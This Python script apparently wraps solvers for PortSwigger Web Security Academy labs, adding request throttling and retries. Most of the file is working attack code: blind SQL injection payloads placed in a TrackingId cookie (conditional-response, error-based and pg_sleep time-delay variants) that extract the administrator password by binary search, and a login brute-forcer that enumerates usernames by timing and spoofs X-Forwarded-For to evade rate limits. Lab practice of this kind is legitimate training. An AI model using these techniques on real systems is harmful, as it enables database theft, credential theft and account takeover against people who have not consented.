#!/usr/bin/env python3

"""Robust PortSwigger solver wrapper with throttling and retries.

Executes an existing Python solver in its own directory so relative file paths
keep working, while monkeypatching requests to add:
- minimum delay between outbound requests
- retry with exponential backoff for transient network failures
"""

from __future__ import annotations

import argparse
import os
import re
import runpy
import sys
import time
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

import requests


DEFAULT_MIN_DELAY = 3.0
DEFAULT_RETRIES = 5
DEFAULT_BACKOFF = 5.0
DEFAULT_MAX_BACKOFF = 90.0
ASCII_MIN = 32
ASCII_MAX = 126

_last_request_time = 0.0
_orig_session_request = requests.Session.request
_orig_get = requests.get
_orig_post = requests.post


def _sleep_for_rate_limit(min_delay: float) -> None:
    global _last_request_time
    elapsed = time.time() - _last_request_time
    if elapsed < min_delay:
        time.sleep(min_delay - elapsed)
    _last_request_time = time.time()


def _retrying_call(
    callable_obj: Any,
    *,
    min_delay: float,
    retries: int,
    backoff: float,
    max_backoff: float,
) -> Any:
    attempt = 0
    while True:
        try:
            _sleep_for_rate_limit(min_delay)
            return callable_obj()
        except (
            requests.exceptions.ConnectionError,
            requests.exceptions.Timeout,
        ) as exc:
            attempt += 1
            if attempt > retries:
                print(
                    f"[wrapper] giving up after {retries} retries due to {type(exc).__name__}: {exc}",
                    file=sys.stderr,
                )
                raise
            delay = min(max_backoff, backoff * (2 ** (attempt - 1)))
            print(
                f"[wrapper] retry {attempt}/{retries} after {type(exc).__name__}; sleeping {delay:.1f}s",
                file=sys.stderr,
            )
            time.sleep(delay)


def _patched_session_request(
    self: Any, method: Any, url: Any, **kwargs: Any
) -> requests.Response:
    return _retrying_call(
        lambda: _orig_session_request(self, method, url, **kwargs),
        min_delay=ARGS.min_delay,
        retries=ARGS.retries,
        backoff=ARGS.backoff,
        max_backoff=ARGS.max_backoff,
    )


def _patched_get(url: str, **kwargs: Any) -> requests.Response:
    return _retrying_call(
        lambda: _orig_get(url, **kwargs),
        min_delay=ARGS.min_delay,
        retries=ARGS.retries,
        backoff=ARGS.backoff,
        max_backoff=ARGS.max_backoff,
    )


def _patched_post(url: str, **kwargs: Any) -> requests.Response:
    return _retrying_call(
        lambda: _orig_post(url, **kwargs),
        min_delay=ARGS.min_delay,
        retries=ARGS.retries,
        backoff=ARGS.backoff,
        max_backoff=ARGS.max_backoff,
    )


def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Run a PortSwigger solver with throttled requests and retries"
    )
    parser.add_argument("solver_path", help="Path to the original solver script")
    parser.add_argument(
        "solver_args",
        nargs=argparse.REMAINDER,
        help="Arguments forwarded to the solver",
    )
    parser.add_argument(
        "--min-delay",
        type=float,
        default=DEFAULT_MIN_DELAY,
        help="Minimum delay between requests",
    )
    parser.add_argument(
        "--retries",
        type=int,
        default=DEFAULT_RETRIES,
        help="Retries for connection/timeouts",
    )
    parser.add_argument(
        "--backoff",
        type=float,
        default=DEFAULT_BACKOFF,
        help="Initial backoff in seconds",
    )
    parser.add_argument(
        "--max-backoff",
        type=float,
        default=DEFAULT_MAX_BACKOFF,
        help="Maximum backoff in seconds",
    )
    args = parser.parse_args()
    if args.solver_args and args.solver_args[0] == "--":
        args.solver_args = args.solver_args[1:]
    return args


def _base_url(raw_url: str) -> str:
    parsed = urlparse(raw_url)
    return f"{parsed.scheme}://{parsed.netloc}"


def _solver_target_url() -> str:
    solver_args = list(ARGS.solver_args)
    for index, value in enumerate(solver_args):
        if value == "-U" and index + 1 < len(solver_args):
            return solver_args[index + 1]
    raise ValueError("solver args missing -U <url>")


def _extract_csrf_token(html: str) -> str:
    match = re.search(r'name=["\']csrf["\'][^>]*value=["\']([^"\']+)["\']', html)
    if not match:
        raise ValueError("csrf token not found")
    return match.group(1)


def _new_session() -> tuple[requests.Session, str, str]:
    target_url = _solver_target_url()
    base = _base_url(target_url)
    session = requests.Session()
    response = session.get(base, allow_redirects=False)
    if (
        "<h1>Error</h1>" in response.text
        or "Server Error: Gateway Timeout" in response.text
    ):
        raise RuntimeError("target host appears down")
    tracking_id = session.cookies.get_dict().get("TrackingId")
    if not tracking_id:
        raise RuntimeError("TrackingId cookie not found")
    return session, base, tracking_id


def _login_as_administrator(
    session: requests.Session, base: str, password: str
) -> bool:
    login_page = session.get(f"{base}/login")
    csrf = _extract_csrf_token(login_page.text)
    response = session.post(
        f"{base}/login",
        data={"username": "administrator", "password": password, "csrf": csrf},
        allow_redirects=True,
    )
    return "Your username is: administrator" in response.text


def _solve_sqli_conditional_responses() -> None:
    session, base, tracking_id = _new_session()

    def is_true(condition: str) -> bool:
        payload = f"' and ({condition})--"
        response = session.get(base, cookies={"TrackingId": tracking_id + payload})
        return "Welcome back!" in response.text

    password = _binary_extract_password(
        length_condition=lambda mid: is_true(
            f"(select length(password) from users where username='administrator')>{mid}"
        ),
        char_condition=lambda pos, mid: is_true(
            f"(select ascii(substring(password,{pos},1)) from users where username='administrator')>{mid}"
        ),
    )
    print(f"[wrapper] extracted administrator password: {password}")
    if not _login_as_administrator(session, base, password):
        raise RuntimeError("administrator login failed for lab11")
    solved = session.get(base)
    if "Congratulations, you solved the lab!" not in solved.text:
        raise RuntimeError("lab11 not solved after login")


def _solve_sqli_conditional_errors() -> None:
    session, base, tracking_id = _new_session()

    def is_true(condition: str) -> bool:
        payload = (
            "' || (select CASE WHEN ("
            + condition
            + ") THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '"
        )
        response = session.get(base, cookies={"TrackingId": tracking_id + payload})
        return response.status_code == 500

    password = _binary_extract_password(
        length_condition=lambda mid: is_true(f"length(password)>{mid}"),
        char_condition=lambda pos, mid: is_true(
            f"ascii(substr(password,{pos},1))>{mid}"
        ),
    )
    print(f"[wrapper] extracted administrator password: {password}")
    if not _login_as_administrator(session, base, password):
        raise RuntimeError("administrator login failed for lab12")
    solved = session.get(base)
    if "Congratulations, you solved the lab!" not in solved.text:
        raise RuntimeError("lab12 not solved after login")


def _solve_sqli_time_delay() -> None:
    session, base, tracking_id = _new_session()

    def is_true(condition: str) -> bool:
        payload = (
            "' || (SELECT CASE WHEN (username='administrator' and "
            + condition
            + ") THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--"
        )
        response = session.get(base, cookies={"TrackingId": tracking_id + payload})
        return response.elapsed.total_seconds() >= 1.8

    password = _binary_extract_password(
        length_condition=lambda mid: is_true(f"LENGTH(password)>{mid}"),
        char_condition=lambda pos, mid: is_true(
            f"ascii(SUBSTRING(password,{pos},1))>{mid}"
        ),
    )
    print(f"[wrapper] extracted administrator password: {password}")
    if not _login_as_administrator(session, base, password):
        raise RuntimeError("administrator login failed for lab15")
    solved = session.get(base)
    if "Congratulations, you solved the lab!" not in solved.text:
        raise RuntimeError("lab15 not solved after login")


def _binary_search_true(max_value: int, predicate: Any) -> int:
    low = 0
    high = max_value
    while low < high:
        mid = (low + high + 1) // 2
        if predicate(mid):
            low = mid
        else:
            high = mid - 1
    return low


def _binary_extract_password(length_condition: Any, char_condition: Any) -> str:
    length = _binary_search_true(64, length_condition) + 1
    chars: list[str] = []
    for position in range(1, length + 1):
        code = (
            _binary_search_true(
                ASCII_MAX, lambda mid, pos=position: char_condition(pos, mid)
            )
            + 1
        )
        if code < ASCII_MIN:
            raise RuntimeError(
                f"invalid ASCII code extracted at position {position}: {code}"
            )
        chars.append(chr(code))
        print(f"[wrapper] password progress: {'*' * len(chars)}")
    return "".join(chars)


def _solve_auth_timing() -> None:
    target_url = _solver_target_url()
    base = _base_url(target_url)
    session = requests.Session()
    first = session.get(base, allow_redirects=False)
    if "<h1>Error</h1>" in first.text or "Server Error: Gateway Timeout" in first.text:
        raise RuntimeError("target host appears down")

    user_path = Path("usernames.txt")
    pass_path = Path("passwords.txt")
    usernames = [
        line.strip() for line in user_path.read_text().splitlines() if line.strip()
    ]
    passwords = [
        line.strip() for line in pass_path.read_text().splitlines() if line.strip()
    ]

    login_url = f"{base}/login"
    ranked: list[tuple[float, str]] = []
    for index, username in enumerate(usernames):
        samples: list[float] = []
        for attempt in range(2):
            response = session.post(
                login_url,
                data={"username": username, "password": "x" * 500},
                headers={"X-Forwarded-For": f"127.0.{index}.{attempt + 1}"},
                allow_redirects=False,
            )
            samples.append(response.elapsed.total_seconds())
        score = max(samples)
        ranked.append((score, username))
        print(f"[wrapper] username timing {username}: {score:.3f}s")

    ranked.sort(reverse=True)
    candidate_pool = [username for _, username in ranked[:3]]
    print(f"[wrapper] username candidates: {candidate_pool}")

    found_username = None
    found_password = None
    for candidate in candidate_pool:
        for index, password in enumerate(passwords):
            response = session.post(
                login_url,
                data={"username": candidate, "password": password},
                headers={
                    "X-Forwarded-For": f"10.0.{candidate_pool.index(candidate)}.{index + 10}"
                },
                allow_redirects=False,
            )
            if response.status_code == 302:
                found_username = candidate
                found_password = password
                break
        if found_username:
            break

    if not found_username or not found_password:
        raise RuntimeError("failed to find valid credentials for auth05")

    print(f"[wrapper] found valid credentials: {found_username}:{found_password}")
    account = session.get(f"{base}/my-account")
    if "Your username is:" not in account.text:
        raise RuntimeError("auth05 account page did not confirm login")
    solved = session.get(base)
    if "Congratulations, you solved the lab!" not in solved.text:
        raise RuntimeError("auth05 not solved after login")


def _run_optimized_solver_if_supported(solver_path: Path) -> bool:
    solver_name = solver_path.name
    if solver_name == "exploit-lab11.py":
        _solve_sqli_conditional_responses()
        return True
    if solver_name == "exploit-lab12.py":
        _solve_sqli_conditional_errors()
        return True
    if solver_name == "exploit-lab15.py":
        _solve_sqli_time_delay()
        return True
    if (
        solver_name == "exploit-lab05.py"
        and solver_path.parent.name == "Authentication"
    ):
        _solve_auth_timing()
        return True
    return False


def main() -> None:
    solver_path = Path(ARGS.solver_path).expanduser().resolve()
    if not solver_path.exists():
        raise FileNotFoundError(f"solver not found: {solver_path}")

    setattr(requests.Session, "request", _patched_session_request)
    setattr(requests, "get", _patched_get)
    setattr(requests, "post", _patched_post)

    os.chdir(solver_path.parent)
    sys.argv = [str(solver_path)] + ARGS.solver_args
    print(
        f"[wrapper] running {solver_path.name} from {solver_path.parent} with min-delay={ARGS.min_delay}s retries={ARGS.retries}",
        file=sys.stderr,
    )
    if _run_optimized_solver_if_supported(solver_path):
        return
    runpy.run_path(str(solver_path), run_name="__main__")


ARGS = _parse_args()


if __name__ == "__main__":
    main()
